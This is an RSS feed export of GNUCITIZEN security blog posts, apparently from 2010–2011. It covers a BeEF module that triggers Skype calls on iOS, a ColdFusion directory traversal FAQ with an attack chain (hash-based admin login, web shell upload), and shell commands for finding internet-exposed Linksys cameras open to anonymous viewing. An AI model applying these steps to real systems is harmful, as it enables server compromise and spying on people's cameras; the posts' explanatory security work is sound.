@@ -1,0 +1,1419 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>GNUCITIZEN &#187; pagvac</title>
+	<atom:link href="http://www.gnucitizen.org/author/pagvac/feed/" rel="self" type="application/rss+xml" />
+	<link>http://www.gnucitizen.org</link>
+	<description>Information Security Think Tank</description>
+	<lastBuildDate>Fri, 04 May 2012 10:09:57 +0000</lastBuildDate>
+	<language>en</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>http://wordpress.org/?v=3.3.2</generator>
+		<item>
+		<title>Having fun with BeEF, the browser exploitation framework</title>
+		<link>http://www.gnucitizen.org/blog/having-fun-with-beef-the-browser-exploitation-framework/</link>
+		<comments>http://www.gnucitizen.org/blog/having-fun-with-beef-the-browser-exploitation-framework/#comments</comments>
+		<pubDate>Tue, 22 Feb 2011 11:40:26 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=4039</guid>
+		<description><![CDATA[We haven&#8217;t featured any guest bloggers in a while, but we&#8217;re glad to be featuring Chirstian Frichot this month! Christian is a security professional based in Perth, Western Australia. He&#8217;s currently working in the finance industry as part of a tight-knit internal team of security consultants doing their best to protect their business and customers from technical threats such as malware or insecure web applications. [...]]]></description>
+			<content:encoded><![CDATA[<p><em>We haven&#8217;t featured any guest bloggers in a while, but we&#8217;re glad to be featuring <a href="http://un-excogitate.org/">Chirstian Frichot</a> this month! Christian is a security professional based in Perth, Western Australia. He&#8217;s currently working in the finance industry as part of a tight-knit internal team of security consultants doing their best to protect their business and customers from technical threats such as malware or insecure web applications.</em></p>
+
+<p><em>After having met <a href="http://www.bindshell.net/users/Wade">Wade Alcorn</a> (the initial author and project lead of BeEF), Christian mentioned his interest in helping out on the project where he could, which eventually led to Wade accepting his offer. The discussion was held over a couple of bottles of wine, so perhaps Wade&#8217;s regretting the decision now!</em></p>
+
+<p><em>Christian&#8217;s role within the BeEF project, if it were to be defined, is odd-jobs-go-to-boy, command-module implementer, Ext-JS-fighter and twitter maintainer. When Christian is not working on BeEF, he&#8217;s doing his best to represent the Perth OWASP Chapter, or laying down crunchy beats on the drum-kit.</em></p>
+
+<p><em>What follows are Chritian&#8217;s words on the BeEF project.</em><p>
+
+<p>Sorry vegetarians, but BeEF is back. That&#8217;s right, the Browser Exploitation Framework is back, and it has now been rewritten from the ground up in Ruby. For those unfortunate people who haven&#8217;t had a chance to explore the older, PHP version of BeEF you&#8217;re only missing out on one of the greatest, most extensible XSS-payload management and exploitation frameworks out there, and the Ruby re-write is no different.</p>
+
+<p>The Browser Exploitation Framework (BeEF) is a powerful, professional security tool. BeEF is pioneering techniques that provide the experienced penetration tester with practical client side attack vectors. Unlike other security frameworks, BeEF focuses on leveraging browser vulnerabilities to assess the security posture of a target.</p>
+
+<p>One of the newer modules implemented in BeEF utilises the insecure handling of URL schemes in Apple&#8217;s iOS to trick Skype into starting an outbound call. This vulnerability was first written about by <a href="http://www.dhanjani.com/blog/2010/11/insecure-handling-of-url-schemes-in-apples-ios.html">Nitesh Dhanjani</a> and highlights that with the growing popularity of these devices these sorts of issues may lead to losses of information or other negative impacting events. The module itself is as simple as:</p>
+
+<pre><code>beef.execute(function() {
+Â  Â document.body.innerHTML = &quot;&lt;iframe src=skype:&lt;%= @tel_num
+%&gt;?call&gt;&lt;/iframe&gt;&quot;;
+
+Â  Â beef.net.sendback(&quot;&lt;%= @command_url %&gt;&quot;, &lt;%= @command_id %&gt;,
+&quot;result=IFrame Created!&quot;);
+});</code></pre>
+
+<p>which, once added to a particular hooked browsers command queue will simply execute upon next poll, and if they automatically authenticate to the Skype application, will initiate a call. Due to iOS&#8217; multi-tasking the Skype app does pop up to the top, so the end user is aware that the activity is occurring, but they&#8217;re not prompted to &#8220;confirm&#8221; the action. You can see this module demonstrated bellow:</p>
+
+<div class="screen"><iframe title="YouTube video player" width="640" height="390" src="http://www.youtube.com/embed/5SVu6VdLWgs" frameborder="0" allowfullscreen></iframe></div>
+
+<p>The current release is 0.4.2.1-alpha, but by release 0.5 (the Sirloin Release) we&#8217;re expecting to have at least all of the PHP BeEF functionality provided plus much more, including:</p>
+
+<ol>
+<li>jQuery included as part of the hooking process</li>
+<li>Metasploit integration</li>
+<li>Evercookie&#8217;s for persistence even after a hooked browser has been closed</li>
+<li>full event logging, not just keystroke logging, to include window activation/deactivation, mouse clicks, etc</li>
+<li>arbitrary HTTP requester</li>
+<li>proxying</li>
+<li>persistence modules (subtle popups or 100%x100% iframes)</li>
+<li>detecting of social networking authentication status (as per <a href="http://grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information">this</a>)</li>
+</ol>
+
+<p>You can find out more about beef over at <a href="http://beef.googlecode.com">http://beef.googlecode.com</a> or
+by following the <a href="http://twitter.com/beefproject">@beefproject</a>.</p>
+
+<p><em>BeEF &#8211; Get it into ya!</em></p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/having-fun-with-beef-the-browser-exploitation-framework/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+		</item>
+		<item>
+		<title>ColdFusion directory traversal FAQ (CVE-2010-2861)</title>
+		<link>http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/</link>
+		<comments>http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/#comments</comments>
+		<pubDate>Fri, 13 Aug 2010 15:31:33 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[coldfusion]]></category>
+		<category><![CDATA[directory]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[hack]]></category>
+		<category><![CDATA[traversal]]></category>
+		<category><![CDATA[vulnerability]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=3665</guid>
+		<description><![CDATA[A new Adobe hotfix for ColdFusion has been released recently. The vulnerability which was discovered by Richard Brain, was rated as important by Adobe and could affect a large number of Internet-facing web servers. The FAQ bellow is meant to shed some light on this vulnerability so that ColdFusion administrators can understand what they&#8217;re up against. [...]]]></description>
+			<content:encoded><![CDATA[<p>A new Adobe <a href="http://www.adobe.com/support/security/bulletins/apsb10-18.html">hotfix</a> for ColdFusion has been released recently. The vulnerability which was discovered by Richard Brain, was rated as <a href="http://www.adobe.com/devnet/security/security_zone/severity_ratings.html">important</a> by Adobe and could affect a large number of Internet-facing web servers. The FAQ bellow is meant to shed some light on this vulnerability so that ColdFusion administrators can understand what they&#8217;re up against.</p>
+
+<h3>The FAQ</h3>
+
+<p>Finally, by producing this FAQ I will attempt to explain why (at least on certain setups) this vulnerability should have been granted a <strong>CRITICAL</strong> rating by Adobe, rather than Important. As we&#8217;ll see bellow, it is possible to fully compromise the underlying OS of a vulnerable ColdFusion server by exploiting this directory traversal vulnerability.</p>
+
+<h4>How does the vulnerability work?</h4>
+
+<p>The vulnerability is a variation of a classic directory traversal vulnerability, also referred to as arbitrary file retrieval. The attack involves tricking a server-side script to provide the contents of a file that it was not originally supposed to be made available. By moving up a few directory levels, the attacker is able to obtain the contents of files outside the application server&#8217;s webroot via special strings such as <code>../</code>. More information can be found on the <a href="http://www.owasp.org/index.php/Path_Traversal">OWASP</a> website.</p>
+
+<h4>Is authentication required to exploit this vulnerability?</h4>
+
+<p>NO. The attacker doesn&#8217;t require knowledge of any passwords in order to exploit the directory traversal bug.</p>
+
+<h4>What&#8217;s the goal of the attacker when exploiting this vulnerability?</h4>
+
+<p>Just as any other type of directory traversal vulnerability, the attacker would usually attempt to obtain source code of the target site in order to identify security vulneraibilities. Additionally, the attacker would most likely attempt to obtain configuration files containing sensitive information. For instance, in the case of ColdFusion the attacker would most likely attempt to read the contents of <code>neo-security.xml</code> and <code>password.properties</code>. These configuration files contain database connection credentials and the ColdFusion administrator password respectively. Depending on how <code>password.properties</code> has been setup, the ColdFusion admin password will be hashed or stored in clear-text (<code>encrypted=false</code>).</p>
+
+<h4>What&#8217;s the worst that could happen once this vulnerability has been exploited successfully?</h4>
+
+<p>As we&#8217;ll see at the end of this post, once the attacker has gained access to the CF admin console &#8211; e.g.: by cracking the admin password &#8211; it might be possible to fully compromise the underlying OS.</p>
+
+<h4>How can the vulnerability be resolved?</h4>
+
+<p>You can either apply Adobe&#8217;s <a href="http://kb2.adobe.com/cps/857/cpsid_85766.html">patch</a> or restrict access to the following directories and file from trusted IP addresses only: <code>/CFIDE/adminapi/ /CFIDE/administrator/ /CFIDE/componentutils/ /CFIDE/wizards/ /CFIDE/install.cfm</code></p>
+
+<h4>What are the mitigating factors?</h4>
+
+<p>This vulnerability cannot be exploited on ColdFusion 9.X when default settings are used, unless of course you figure out a way to get around the directory traversal signatures used by the filtering routines. Additionally, the ColdFusion administrator login console must be available to the attacker. It is however quite common to find CF admin consoles directly available on the Internet.</p>
+
+<p><del datetime="2010-08-16T22:36:05+00:00">If a long and sufficiently random admin password is used, cracking the SHA1 hash could prove to be difficult. This is applicable to CF MX7, 8 and 9</del> (<strong>see UPDATE notes</strong>). Version 6 doesn&#8217;t hash the password, but instead encrypts it using a proprietary algorithm.</p>
+
+<h4>What versions of ColdFusion are affected?</h4>
+
+<p>According to the Adobe <a href="http://www.adobe.com/support/security/bulletins/apsb10-18.html">bulletin</a> the affected versions are <q>ColdFusion 8.0, 8.0.1, 9.0, 9.0.1 and earlier versions for Windows, Macintosh and UNIX</q>. However, due to time constraints I have only personally confirmed the vulnerability on version 8.0.1 under Windows.</p>
+
+<h4>Can you provide the actual exploit?</h4>
+
+<p>No. ProCheckUp will provide the exploit details at a later date. Although Richard Brain privately shared POC URLs with me, I will not make them available. Exploit details were only provided to me as a trusted security analyst for purpose of assessing the impact of the vulnerability and help me write this FAQ in the hope that it will benefit the community.</p>
+
+<p><strong>UPDATE:</strong> the <a href="http://www.exploit-db.com/exploits/14641/">exploit details</a> were published by an anonymous researcher on <em>14/08/2010</em>, probably worked out by reverse-engineering Adobe&#8217;s patches. ProCheckUp has also released the <a href="http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-07">exploit details</a> as of <em>17/08/2010</em>.</p>
+
+<h4>Can you describe a real attack scenario?</h4>
+
+<p>The following a real attack scenario against ColdFusion 8 on a Windows server:</p>
+
+<ol>
+<li>Attacker confirms ColdFusion admin console is Internet facing. E.g. <code>http://target-domain.foo/CFIDE/administrator/index.cfm</code></li>
+<li>Attacker exploits directory traversal vulnerability and obtains the contents of <code>C:\ColdFusion8\lib\password.properties</code>, which contains the ColdFusion admin password <div class="screen"><a href="http://www.gnucitizen.org/static/blog/2010/08/cf_dir_traversal_exploited.png"><img src="http://www.gnucitizen.org/static/blog/2010/08/cf_dir_traversal_exploited-270x150.png" alt="" title="CF Dir Traversal Exploited PNG" width="270" height="150" class="alignnone size-thumbnail wp-image-3730" /></a></div></li>
+<li>If the admin password was stored encrypted (actually CF8 hashes the admin password using the SHA1 algorithm, similar to CF MX7), the attacker then attempts to crack it via an offline password cracking attack or <a href="http://passcracking.com/">rainbow table</a> <a href="http://hashcrack.com/">lookup</a>. Note that the default setting in ColdFusion 8 is <code>encrypted=true</code> as per <code>password.properties</code> file. Otherwise, if the password is stored unencrypted (<code>encrypted=false</code>), there would be no need for password cracking.</li>
+<li><strong>UPDATE:</strong> as suggested by <a href="http://blog.teusink.net/">Niels Teusink</a>, an attacker could login as the CF administrator without needing to crack the SHA1 hash. I verified his observation and can confirm it works well. You can follow these steps (tested on Firefox 3.6.8) to login using the SHA1 hash. i.e.: no need to crack the password hash: <ol><li>Configure your favorite MITM proxy &#8211; e.g. <a href="http://portswigger.net/proxy/">Burp</a> &#8211; to capture traffic between your browser and target CF admin console</li><li>Enter hash in password field of login form (usually located on <code>/CFIDE/administrator/enter.cfm</code>)</li><li>Type the following on your browser&#8217;s address bar and press enter (make sure JavaScript is enabled on your browser): <code>javascript:hex_hmac_sha1(document.loginform.salt.value,document.loginform.cfadminPassword.value)</code></li><li>Record value. e.g. <code>AFA9C9D917916DE6CE05C1BFEC0470E07A246CB0</code></li><li>Press browser&#8217;s Back button</li><li>Press Login on the login form (trapping/intercept mode should be enabled on your MITM proxy at this point)</li><li>Trap the login request and replace the value of the <code>cfadminPassword</code> parameter with the value recorded above</li><li>Forward request</li></ol></li>
+<li>At this point, the attacker would be able to login as a CF admin and upload a <a href="http://michaeldaw.org/projects/web-backdoor-compilation">malicious CFM script</a> that would allow him to run remote commands (SYSTEM privileges by default). Uploading files to a CF server via the administrator console is a bit counter-intuitive. The attacker would basically add a scheduled task that would download cfexec.cfm to the server&#8217;s webroot <div class="screen"><a href="http://www.gnucitizen.org/static/blog/2010/08/backdoor_task.png"><img src="http://www.gnucitizen.org/static/blog/2010/08/backdoor_task-170x150.png" alt="" title="CF Backdoor Task PNG" width="170" height="150" class="alignnone size-thumbnail wp-image-3705" /></a></div></li>
+<li>At this point, the attacker has gained full control of the underlying Windows OS as the CF service runs with SYSTEM privileges by default <div class="screen"><a href="http://www.gnucitizen.org/static/blog/2010/08/command_execution2.png"><img src="http://www.gnucitizen.org/static/blog/2010/08/command_execution2-362x150.png" alt="" title="CF Command Execution PNG" width="362" height="150" class="alignnone size-thumbnail wp-image-3725" /></a> <a href="http://www.gnucitizen.org/static/blog/2010/08/command_output.png"><img src="http://www.gnucitizen.org/static/blog/2010/08/command_output-300x90.png" alt="" title="CF Command Output PNG" width="300" height="90" class="alignnone size-medium wp-image-3700" /></a></div></a></li>
+</ol>
+
+<p>If the CF admin password is hashed and the attacker is unable to crack it, he could always try to obtain the database connection credentials (<code>C:\ColdFusion8\lib\neo-datasource.xml</code>) which can be <a href="http://hexale.blogspot.com/2008/07/how-to-decrypt-coldfusion-datasource.html">easily decrypted</a> and then directly authenticate to the backend DB server. This however wouldn&#8217;t normally be possible on a firewalled environment where the back-end DB server is not directly exposed to the Internet. Network access controls are your friends!</p>
+
+<h3>Post Updates</h3>
+
+<ul>
+<li><strong>16/09/2010</strong> &#8211; new path added as part of blacklisting solution</li>
+<li><strong>16/09/2010</strong> &#8211; added trick to login without cracking the CF admin password hash</li>
+<li><strong>16/09/2010</strong> &#8211; mentioned recently published exploit code for the CF traversal vulnerability</li>
+<li><strong>18/09/2010</strong> &#8211; fixed typos and mentioned release of exploit details by ProCheckUp</li>
+</ul><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/feed/</wfw:commentRss>
+		<slash:comments>16</slash:comments>
+		</item>
+		<item>
+		<title>1ST European Edition of HITB Coming Up!</title>
+		<link>http://www.gnucitizen.org/blog/1st-european-edition-of-hitb-coming-up/</link>
+		<comments>http://www.gnucitizen.org/blog/1st-european-edition-of-hitb-coming-up/#comments</comments>
+		<pubDate>Thu, 24 Jun 2010 09:16:22 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[Amsterdam]]></category>
+		<category><![CDATA[hitb]]></category>
+		<category><![CDATA[hitbsecconf]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=3656</guid>
+		<description><![CDATA[In case you haven&#8217;t heard yet, HITBSecConf is hosting the first European Edition of their conference in Amsterdam during 1st-2nd July &#8217;10. The history of the HITB conferences can be traced back to 2002, the year in which the first ever edition of HITB took place in Malaysia. Since then, HITB has grown to become the biggest technical computer security event in Asia and has extended their presence to the Middle East and now Europe. [...]]]></description>
+			<content:encoded><![CDATA[<p>In case you haven&#8217;t heard yet, HITBSecConf is hosting the first European Edition of their <a href="http://conference.hackinthebox.org/hitbsecconf2010ams/?page_id=24">conference</a> in Amsterdam during 1st-2nd July &#8217;10. The history of the HITB conferences can be traced back to 2002, the year in which the first ever edition of HITB took place in Malaysia. Since then, HITB has grown to become the biggest technical computer security event in Asia and has extended their presence to the Middle East and now Europe.</p>
+
+<blockquote>HITB aims to congregate members of the security community from all circles. From academics, and well known infosec personalities to loner-type independent researchers, and hobbyists just to name a few. I&#8217;ve personally attended past editions in Kuala Lumpur and Dubai and loved that the attendees and speakers came from a wide variety of backgrounds. If you don&#8217;t believe me, check out the <a href="http://photos.hackinthebox.org/gallery/">pix</a> of past conferences and you&#8217;ll find sec nerds and corporate professionals all partying in unison. Indeed, the HITB conferences are not only educational, but among the most fun sec events I&#8217;ve had the chance to attend.</blockquote>
+
+<p>Registration is still open, so you are still on time to take advantage of a great speaker lineup and one of the _de facto_ party capitals of Europe. The conference agenda can be found <a href="http://conference.hitb.org/hitbsecconf2010ams/agenda.pdf">here</a>.  I&#8217;m really looking forward to Niels Teusink&#8217;s <a href="http://blog.teusink.net/2010/05/presenting-at-hack-in-box-2010.html">presentation</a> on hacking Logitech wireless presenters and the release of detailed examples of JIT-spray techniques against IE8, FF3.6 by <a href="http://dsecrg.com/">Alexey Sintsov</a> (originally <a href="http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf">discussed</a> by Dion Blazakis).</p>
+
+<p>One more thing, almost forgot: there will be a bring-your-own-laptop <a href="http://conference.hitb.org/hitbsecconf2010ams/?page_id=41">web hacking challenge</a> at HITB EU.</p>
+
+<p><em>See you at HITB Amsterdam next month!</em></p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/1st-european-edition-of-hitb-coming-up/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Hacking Linksys IP Cameras (pt 6)</title>
+		<link>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-6/</link>
+		<comments>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-6/#comments</comments>
+		<pubDate>Wed, 24 Feb 2010 07:18:29 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[bruteforcing]]></category>
+		<category><![CDATA[camera]]></category>
+		<category><![CDATA[discovery]]></category>
+		<category><![CDATA[dnsmap]]></category>
+		<category><![CDATA[linksys]]></category>
+		<category><![CDATA[privacy]]></category>
+		<category><![CDATA[subdomain]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=3415</guid>
+		<description><![CDATA[This article is a continuation of the following GNUCITIZEN articles: here, here, here, here and here.
+
+As we know, there are several ways one could go about hunting for IP cameras on the net. The slowest way would be to portscan random IP addresses for certain ports and programmatically detect if the web interface of a given camera was available on the open ports found. [...]]]></description>
+			<content:encoded><![CDATA[<p><em>This article is a continuation of the following GNUCITIZEN articles: <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-1/">here</a>, <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-2/">here</a>, <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-3/">here</a>, <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-4/">here</a> and <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-5/">here</a>.</em></p>
+
+<p>As we know, there are several ways one could go about hunting for IP cameras on the net. The slowest way would be to portscan random IP addresses for certain ports and programmatically detect if the web interface of a given camera was available on the open ports found. This method definitely works, but it can be very time consuming as it consists of scanning random IP addresses hoping that we&#8217;ll eventually come across the type of device we&#8217;re interested in.</p>
+
+<p>The second method, which would be much faster in finding our target devices, would be to use a <a href="http://www.google.co.uk/search?ie=UTF-8&#038;q=inurl:/img/vr.htm">search engine</a> and query content that is unique to our target devices (e.g.: URLs, HTML title). This method, popularized by <a href="http://www.hackersforcharity.org/ghdb/?function=summary&#038;cat=18">GHDB</a> is simple and effective. The only issue I find with this strategy is that many of these IP cameras found happen to respond very slowly. This is probably due to other curious individuals running the same searches and accessing the same cameras.</p>
+
+<p>The third method which would allow you to find more hidden Linksys IP cameras (i.e.: not cached by search engines a.k.a. the <a href="http://www.ericdigests.org/2002-2/hidden.htm">hidden web</a>), would consist of bruteforcing subdomains within dynamic domain names (DDNS) used by our target devices (Linksys IP cameras in this case). For instance, the following are some of the dynamic domain names supported by the WVC54GCA and WVC80N Linksys IP camera models:</p>
+
+<ul>
+<li><code>linksys-cam.com</code></li>
+<li><code>mylinksyscamera.com</code></li>
+<li><code>mylinksyshome.com</code></li>
+<li><code>mylinksyscam.com</code></li>
+<li><code>mylinksysview.com</code></li>
+<li><code>linksysremotecam.com</code></li>
+<li><code>linksysremoteview.com</code></li>
+<li><code>linksyshomemonitor.com</code></li>
+</ul>
+
+<h3>Camera discovery process through subdomain bruteforcing</h3>
+
+<p>We first save the aforementioned domains in a file, <code>doms</code> in this case. Then we use <a href="http://code.google.com/p/dnsmap/">dnsmap</a> to bruteforce subdomains for each of the domains included in <code>doms</code>.</p>
+
+<p>Using dnsmap&#8217;s built-in wordlist:</p>
+
+<pre><code>$ for i in `cat doms`;do dnsmap $i -r ~/ -i 64.14.13.199,216.39.81.84&done;</code></pre>
+
+<p>Using a user-supplied wordlist, <code>wordlist_TLAs.txt</code> in this case, which is a three-letter acronym wordlist included with dnsmap v0.30:</p>
+
+<pre><code>$ for i in `cat doms`;do dnsmap $i -w wordlist_TLAs.txt -r ~/ -i 64.14.13.199,216.39.81.84&done;</code></pre>
+
+<p><em>Note: dnsmap&#8217;s <code>-i</code> option allows ignoring user-supplied IP addresses from the results. In this case, 64.14.13.199 and 216.39.81.84 belong to the <a href="http://www.tzo.com/">DDNS service provider</a>, and would therefore be regarded as false positives in this case (we&#8217;re only interested in IP cameras setup by their respective owners after all).</em> For more info on how to use dnsmap, checkout the <a href="http://code.google.com/p/dnsmap/source/browse/trunk/README.txt">README</a> file.</p>
+
+<p>We then parse the IP addresses of the subdomains discovered by dnsmap:</p>
+
+<pre><code>$ grep \# dnsmap*.txt | awk '{print $4}' | sort | uniq > ips.txt</code></pre>
+
+<p>Next, we scan for ports that could potentially be used by a Linksys IP camera web server. In this case, we choose TCP ports 80, 1024 and 1025 as candidates:</p>
+
+<pre><code>$ sudo nmap -v -T4 -n -P0 -sS -p80,1024,1025 -iL ips.txt -oA nmap_http_ports.`date +%Y-%m-%d-%H%M%S`</pre></code>
+
+<p>This leaves us with a lot of discovered services, but we don't quite yet know which of them correspond to actual Linksys IP cameras web interfaces. There are many ways to fingreprint the web server of a Linksys IP camera. In this case we chose to create our own <a href="http://freeworld.thc.org/thc-amap/">amap</a> response signature, and then scan the open ports with amap.</p>
+
+<p>Before amap is capable of identifying our target Linksys IP cams, the following response signature needs to be added to <code>appdefs.resp</code>, and amap then needs to be recompiled. Otherwise amap won't take the new signature into account:</p>
+
+<pre><code>http-linksys-cam::tcp::^HTTP/.*\nServer: thttpd/.*Accept-Ranges: bytes.*WVC</code></pre>
+
+<p>Please note that <em>the previous amap response signature was only tested against the WVC54GCA and WVC80N Linksys IP camera models.</em> So I'm not sure if it will work against other models. You've been warned!</p>
+
+<p>Once recompiled, amap can be used to identify Linksys IP cameras from nmap's open ports results. </p>
+
+<pre><code>$ amap -i nmap_http_ports.2010-02-22-102001.gnmap -R -S -o amap_results.`date +%Y-%m-%d-%H%M%S`</code></pre>
+
+<p>We finally parse the IP addresses and open ports for all discovered Linksys IP cameras:</p>
+
+<pre><code>$ grep http-linksys-cam amap_results.2010-02-22-102253 | awk '{print $3}' | cut -d \/ -f1
+x.x.167.245:1024
+x.x.228.231:1025
+x.x.228.231:80
+x.x.64.22:80
+x.x.206.70:1024
+x.x.31.4:1024
+x.x.164.28:1024
+<em>[snip]</em></code></pre>
+
+<p>At this point we have accomplished the task of creating a list of Linksys IP cameras without resorting to search engines or scanning random IP addresses. In order to discover more Linksys cameras, a more comprehensive wordlist would need to be used with dnsmap.</p>
+
+<p>Of course, even further automation would be possible. For instance, an attacker may wish to programmatically identify which Linksys cameras from the previous list allowing video viewing to unauthenticated users:</p>
+
+<pre><code>$ amapfile=amap_results.2010-02-22-102253;for i in `grep http-linksys-cam $amapfile | awk '{print $3}' | cut -d \/ -f1`;do url="http://$i/img/main.cgi?next_file=main.htm";if curl --connect-timeout 2 -s -I --url $url | grep ^"HTTP/1.1 501">/dev/null;then echo $url;fi;done;
+x.x.206.70:1024/img/main.cgi?next_file=main.htm
+x.x.105.221:1024/img/main.cgi?next_file=main.htm
+x.x.105.221:80/img/main.cgi?next_file=main.htm
+x.x.181.195:1024/img/main.cgi?next_file=main.htm
+x.x.243.154:1024/img/main.cgi?next_file=main.htm
+x.x.243.154:1025/img/main.cgi?next_file=main.htm
+x.x.30.196:1025/img/main.cgi?next_file=main.htm
+<em>[snip]</em></code></pre>
+
+<p><em>In addition to automatically checking for anonymous video viewing on all cameras found, other tasks such as checking for default credentials (<code>admin</code>/<code>admin</code>) could also be scripted, although this will NOT be included in this post (or any other at GNUCITIZEN).</em></p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-6/feed/</wfw:commentRss>
+		<slash:comments>8</slash:comments>
+		</item>
+		<item>
+		<title>Dnsmap v0.30 is now out!</title>
+		<link>http://www.gnucitizen.org/blog/dnsmap-v030-is-now-out/</link>
+		<comments>http://www.gnucitizen.org/blog/dnsmap-v030-is-now-out/#comments</comments>
+		<pubDate>Sat, 20 Feb 2010 21:08:48 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[bruteforce]]></category>
+		<category><![CDATA[bruteforcing]]></category>
+		<category><![CDATA[dnsmap]]></category>
+		<category><![CDATA[enumeration]]></category>
+		<category><![CDATA[subdmain]]></category>
+		<category><![CDATA[tool]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=3381</guid>
+		<description><![CDATA[After working on dnsmap for a few months whenever time allowed, I decided there were enough additional goodies to make version 0.30 a new public release. Let me just say that a lot of the bugs that have been fixed, and features that have been added to this version would not be possible without the feedback from great folks such as Borys Lacki (www.bothunters.pl), Philipp Winter (7c0.org) and meathive (kinqpinz.info). Thanks guys, your feedback was highly valuable to me. [...]]]></description>
+			<content:encoded><![CDATA[<p>After working on <a href="http://dnsmap.googlecode.com/">dnsmap</a> for a few months whenever time allowed, I decided there were enough additional goodies to make <code>version 0.30</code> a new public release. Let me just say that a lot of the bugs that have been fixed, and features that have been added to this version would not be possible without the feedback from great folks such as Borys Lacki (<code>www.bothunters.pl</code>), Philipp Winter (<code>7c0.org</code>) and meathive (<code>kinqpinz.info</code>). Thanks guys, your feedback was highly valuable to me.</p>
+
+<h3>New Features</h3>
+
+<p>Anyways, the following are some of the new features included:</p>
+
+<ul>
+<li>IPv6 support</li>
+<li>Makefile included</li>
+<li>delay option (-d) added. This is useful in cases where dnsmap is killing your bandwidth</li>
